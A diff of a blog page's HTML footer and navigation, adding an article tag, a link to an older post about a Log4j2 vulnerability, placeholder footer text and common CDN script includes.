-<script src="/js/xenon-custom.min.js"></script>
 
 
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+          </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <span id="article-nav-newer" class="article-nav-link-wrap newer"></span>
+  
+  
+    <a href="/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
 
 
 
-<script src="/js/lozad.min.js"></script>
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 
 
 
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
-  
-</body>
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
 
+
+
+
+<script src="/js/typing.js"></script>
+
+<!--[if lt IE 9]>
+<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
+<![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
 </html>
